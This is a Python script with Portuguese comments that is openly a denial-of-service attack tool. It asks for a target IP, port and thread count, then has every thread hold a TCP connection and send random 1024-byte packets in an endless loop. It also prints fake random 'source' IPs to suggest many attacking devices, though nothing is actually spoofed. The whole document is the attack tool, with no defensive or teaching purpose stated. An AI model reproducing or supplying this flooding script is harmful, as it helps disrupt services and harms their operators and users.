import socket
import threading
import random
import time
import sys

# Função para gerar IPs aleatórios simulando múltiplos dispositivos
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Função de ataque que utiliza threads para enviar pacotes
def attack(target_ip, target_port, attack_id):
    try:
        # Criar um socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Define o tempo de espera para conexão
        
        # Conectar ao servidor de destino
        sock.connect((target_ip, target_port))
        print(f"Ataque {attack_id} iniciado de {generate_random_ip()} para {target_ip}:{target_port}")

        # Enviar pacotes continuamente
        while True:
            # Enviar um pacote de dados aleatório para o servidor
            sock.sendto(random._urandom(1024), (target_ip, target_port))
            print(f"Ataque {attack_id} em andamento: {generate_random_ip()} -> {target_ip}:{target_port}")
            time.sleep(0.1)  # Controle de envio para evitar bloqueio por flood

    except socket.error as e:
        print(f"Ataque {attack_id} falhou para {target_ip}:{target_port} - Erro: {e}")
    
# Função que coordena o ataque com várias threads
def start_attack(target_ip, target_port, num_threads):
    print("[*] Iniciando ataque de DDoS...")
    threads = []

    # Criação de múltiplas threads para ataque simultâneo
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, i + 1))
        threads.append(thread)
        thread.start()

    # Aguardar todas as threads terminarem
    for thread in threads:
        thread.join()

    print("[*] Ataque concluído com sucesso!")

# Função principal que solicita as entradas do usuário e inicia o ataque
def main():
    try:
        target_ip = input("Digite o IP do alvo (ex: 192.168.1.1): ")
        target_port = int(input("Digite a porta do alvo (ex: 80): "))
        num_threads = int(input("Digite o número de threads para o ataque: "))

        # Iniciar o ataque com os parâmetros fornecidos
        start_attack(target_ip, target_port, num_threads)
        
    except ValueError:
        print("Erro: Entrada inválida! Certifique-se de inserir números para a porta e o número de threads.")
        sys.exit(1)

# Executando o script
if __name__ == "__main__":
    main()
